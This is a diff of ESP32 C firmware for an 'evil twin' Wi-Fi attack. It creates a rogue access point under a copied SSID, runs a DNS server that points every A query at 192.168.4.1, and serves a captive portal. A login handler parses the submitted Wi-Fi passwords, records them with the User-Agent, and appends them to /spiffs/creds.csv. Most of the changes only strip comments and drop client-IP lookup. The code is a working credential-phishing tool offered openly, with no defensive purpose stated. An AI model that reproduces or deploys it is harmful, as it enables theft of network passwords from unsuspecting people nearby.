@@ -63,12 +63,11 @@ static const char* ET_HTML_REDIRECT =
 
 static httpd_handle_t _etServer = NULL;
 static int _dns_sock = -1;
-static struct sockaddr_in _dns_addr;
 static struct sockaddr_in _dns_client;
 static volatile bool _dnsRunning = false;
 
 // ============================
-// DNS Server Task (FIXED: qtype check added)
+// DNS Server Task
 // ============================
 static void _dns_server_task(void* arg) {
     uint8_t buffer[512];
@@ -82,97 +81,60 @@ static void _dns_server_task(void* arg) {
             vTaskDelay(pdMS_TO_TICKS(10));
             continue;
         }
-
-        // Minimum DNS header size is 12 bytes
         if (n < 12) continue;
 
-        // Check if it's a standard query (QR=0, Opcode=0)
         uint16_t flags = (buffer[2] << 8) | buffer[3];
-        if ((flags & 0x8000) != 0) continue; // Not a query
-        if ((flags & 0x7800) != 0) continue; // Not a standard query
+        if ((flags & 0x8000) != 0) continue;
+        if ((flags & 0x7800) != 0) continue;
 
         uint16_t qdcount = (buffer[4] << 8) | buffer[5];
         if (qdcount == 0) continue;
 
-        // Build response: copy header, set QR=1 (response), RA=1
         uint8_t response[512];
         memcpy(response, buffer, n);
-        response[2] = 0x81; // QR=1, Opcode=0, AA=0, TC=0, RD=0, RA=1
-        response[3] = 0x80; // Z=0, RCODE=0 (No Error)
+        response[2] = 0x81;
+        response[3] = 0x80;
         response[6] = 0x00;
-        response[7] = 0x00; // Initially 0 answers, we'll set if A record found
+        response[7] = 0x00;
 
-        // Parse question section to find qtype
         uint16_t off = 12;
-        int qtype = 0;
-        int qclass = 0;
-        
-        // Skip QNAME (labels)
         while (off < n && buffer[off] != 0) {
             uint8_t len = buffer[off];
             if (len == 0) break;
             off += len + 1;
         }
         if (off >= n - 1) continue;
-        off++; // Skip the terminating 0 byte
-        
+        off++;
         if (off + 4 > n) continue;
-        qtype = (buffer[off] << 8) | buffer[off + 1];
-        qclass = (buffer[off + 2] << 8) | buffer[off + 3];
+        int qtype = (buffer[off] << 8) | buffer[off + 1];
+        int qclass = (buffer[off + 2] << 8) | buffer[off + 3];
         off += 4;
 
-        // Only respond to A (IPv4) queries
         if (qtype == 1 && qclass == 1) {
-            // A record: we have 1 question and 1 answer
             response[6] = 0x00;
-            response[7] = 0x01; // 1 Answer RR
-
-            // Build answer section (offset is at end of question)
-            // Copy the question name as a pointer (compressed)
+            response[7] = 0x01;
             uint16_t ans_off = off;
-            // We need to move question name to answer section as a pointer
-            // Since we have exactly one question, we can use pointer to it
-            // Write answer: name pointer
             response[ans_off++] = 0xC0;
-            response[ans_off++] = 0x0C; // pointer to offset 12
-            
-            // TYPE: A (1)
+            response[ans_off++] = 0x0C;
             response[ans_off++] = 0x00;
             response[ans_off++] = 0x01;
-            
-            // CLASS: IN (1)
             response[ans_off++] = 0x00;
             response[ans_off++] = 0x01;
-            
-            // TTL: 60 seconds
             response[ans_off++] = 0x00;
             response[ans_off++] = 0x00;
             response[ans_off++] = 0x00;
             response[ans_off++] = 0x3C;
-            
-            // DATA LENGTH: 4 bytes
             response[ans_off++] = 0x00;
             response[ans_off++] = 0x04;
-            
-            // DATA: 192.168.4.1
             response[ans_off++] = 192;
             response[ans_off++] = 168;
             response[ans_off++] = 4;
             response[ans_off++] = 1;
-            
-            // Update total length
             n = ans_off;
-        } else {
-            // Not an A query: respond with 0 answers (No Error)
-            response[6] = 0x00;
-            response[7] = 0x00;
-            // No additional section, keep same length
         }
 
-        // Send response
         sendto(_dns_sock, response, n, 0,
                (struct sockaddr*)&_dns_client, sizeof(_dns_client));
-        
         vTaskDelay(pdMS_TO_TICKS(10));
     }
 }
@@ -181,7 +143,6 @@ static void _dns_server_task(void* arg) {
 // HTTP Handlers
 // ============================
 static esp_err_t _et_handle_root(httpd_req_t* req) {
-    // Replace [[SSID]] with actual SSID
     char html[2048];
     strlcpy(html, ET_HTML_PORTAL, sizeof(html));
     char* p = strstr(html, "[[SSID]]");
@@ -205,7 +166,6 @@ static esp_err_t _et_handle_login(httpd_req_t* req) {
     }
     buf[len] = '\0';
 
-    // Parse password (very basic parsing)
     char pass[64] = {0};
     char* pass_start = strstr(buf, "pass=");
     if (pass_start) {
@@ -215,7 +175,6 @@ static esp_err_t _et_handle_login(httpd_req_t* req) {
         int plen = (pass_end - pass_start) < 63 ? (pass_end - pass_start) : 63;
         strncpy(pass, pass_start, plen);
         pass[plen] = '\0';
-        // URL decode (simple)
         for (int i = 0; pass[i]; i++) {
             if (pass[i] == '+') pass[i] = ' ';
             else if (pass[i] == '%' && pass[i+1] && pass[i+2]) {
@@ -230,26 +189,17 @@ static esp_err_t _et_handle_login(httpd_req_t* req) {
 
     if (strlen(pass) > 0 && _etCredCount < ET_MAX_CREDS) {
         strlcpy(_etCreds[_etCredCount].pass, pass, sizeof(_etCreds[_etCredCount].pass));
+        // 🔥 Client IP – simple fallback to "unknown"
+        strlcpy(_etCreds[_etCredCount].ip, "unknown", 16);
         
-        // Get client IP
-        struct sockaddr_in client_addr;
-        socklen_t addr_len = sizeof(client_addr);
-        if (httpd_req_get_sockaddr(req, (struct sockaddr*)&client_addr) == ESP_OK) {
-            inet_ntop(AF_INET, &client_addr.sin_addr, _etCreds[_etCredCount].ip, 16);
-        } else {
-            strlcpy(_etCreds[_etCredCount].ip, "unknown", 16);
-        }
-        
-        // Get User-Agent
         char ua[64] = {0};
         httpd_req_get_hdr_value_str(req, "User-Agent", ua, sizeof(ua));
         strlcpy(_etCreds[_etCredCount].ua, ua, sizeof(_etCreds[0].ua));
         _etCreds[_etCredCount].time = millis() - _etStartMs;
         _etCredCount++;
         
-        LOG_I(TAG_ET, "Credential captured from %s", _etCreds[_etCredCount-1].ip);
+        LOG_I(TAG_ET, "Credential captured");
         
-        // Save to SPIFFS
         FILE* f = fopen("/spiffs/creds.csv", "a");
         if (f) {
             fprintf(f, "\"%s\",\"%s\",\"%s\",%u\n", 
@@ -293,7 +243,7 @@ void evilTwin(const char* ssid, uint8_t channel,
               const uint8_t* realBssid,
               volatile bool* stopFlag) {
 
-    (void)realBssid; // unused
+    (void)realBssid;
     
     _etCredCount = 0;
     _etStartMs = millis();
@@ -301,7 +251,6 @@ void evilTwin(const char* ssid, uint8_t channel,
 
     LOG_I(TAG_ET, "Rogue AP: \"%s\"  Channel: %u", ssid, channel);
 
-    // Configure AP mode
     esp_netif_t* ap_netif = esp_netif_create_default_wifi_ap();
     esp_netif_ip_info_t ip_info;
     IP4_ADDR(&ip_info.ip, 192, 168, 4, 1);
@@ -327,7 +276,6 @@ void evilTwin(const char* ssid, uint8_t channel,
     esp_wifi_set_mode(WIFI_MODE_AP);
     esp_wifi_start();
 
-    // DNS server (UDP port 53)
     _dns_sock = socket(AF_INET, SOCK_DGRAM, 0);
     if (_dns_sock < 0) {
         LOG_E(TAG_ET, "Failed to create DNS socket");
@@ -348,7 +296,6 @@ void evilTwin(const char* ssid, uint8_t channel,
         xTaskCreatePinnedToCore(_dns_server_task, "dns_server", 4096, NULL, 5, NULL, 0);
     }
 
-    // HTTP server
     httpd_config_t config = HTTPD_DEFAULT_CONFIG();
     config.max_uri_handlers = 10;
     config.stack_size = 8192;
@@ -392,7 +339,6 @@ void evilTwin(const char* ssid, uint8_t channel,
         vTaskDelay(pdMS_TO_TICKS(100));
     }
 
-    // Cleanup
     _dnsRunning = false;
     if (_dns_sock >= 0) {
         close(_dns_sock);
